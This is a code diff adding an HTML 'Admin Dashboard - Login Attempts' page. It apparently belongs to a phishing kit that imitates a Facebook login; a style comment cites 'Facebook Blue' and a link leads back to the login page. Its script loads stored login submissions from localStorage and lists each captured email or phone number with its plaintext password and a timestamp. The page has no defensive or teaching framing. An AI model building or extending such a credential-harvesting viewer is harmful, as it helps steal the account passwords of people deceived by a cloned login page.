@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Login Attempts</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+        }
+        .dashboard-container {
+            max-width: 900px;
+            margin: 40px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+        }
+        h1 {
+            color: #1c1e21;
+            border-bottom: 1px solid #dddfe2;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #dddfe2;
+            word-break: break-all;
+        }
+        th {
+            background-color: #f5f6f7;
+            font-weight: bold;
+        }
+        tr:hover {
+            background-color: #f5f6f7;
+        }
+        .no-data {
+            text-align: center;
+            color: #606770;
+            font-style: italic;
+            padding: 20px;
+        }
+        .button-container {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        button, a {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+            color: white;
+            display: inline-block;
+            text-align: center;
+        }
+        #clear-data-btn {
+            background-color: #fa3e3e;
+        }
+        #clear-data-btn:hover {
+            background-color: #e03030;
+        }
+        .back-link {
+            background-color: #1877F2; /* Facebook Blue for consistency */
+        }
+        .back-link:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="dashboard-container">
+        <h1>Admin Dashboard - Login Attempts</h1>
+        <table>
+            <thead>
+                <tr>
+                    <th>Email / Phone</th>
+                    <th>Password</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody id="submission-data">
+                <!-- Data from localStorage will be populated here -->
+            </tbody>
+        </table>
+        <div class="button-container">
+            <a href="index.html" class="back-link">Back to Login Page</a>
+            <button id="clear-data-btn">Clear All Data</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const submissionTableBody = document.getElementById('submission-data');
+            const clearDataBtn = document.getElementById('clear-data-btn');
+
+            function loadSubmissions() {
+                submissionTableBody.innerHTML = '';
+                const submissions = JSON.parse(localStorage.getItem('loginSubmissions')) || [];
+
+                if (submissions.length === 0) {
+                    const row = submissionTableBody.insertRow();
+                    row.insertCell().colSpan = 3;
+                    row.cells[0].textContent = 'No login attempts recorded yet.';
+                    row.cells[0].classList.add('no-data');
+                } else {
+                    submissions.reverse().forEach(sub => {
+                        const row = submissionTableBody.insertRow();
+                        row.insertCell(0).textContent = sub.email;
+                        row.insertCell(1).textContent = sub.password;
+                        row.insertCell(2).textContent = sub.timestamp;
+                    });
+                }
+            }
+            
+            clearDataBtn.addEventListener('click', () => {
+                if (confirm('Are you sure you want to delete all submission data?')) {
+                    localStorage.removeItem('loginSubmissions');
+                    loadSubmissions(); // Refresh table
+                }
+            });
+
+            loadSubmissions();
+        });
+    </script>
+
+</body>
+</html>
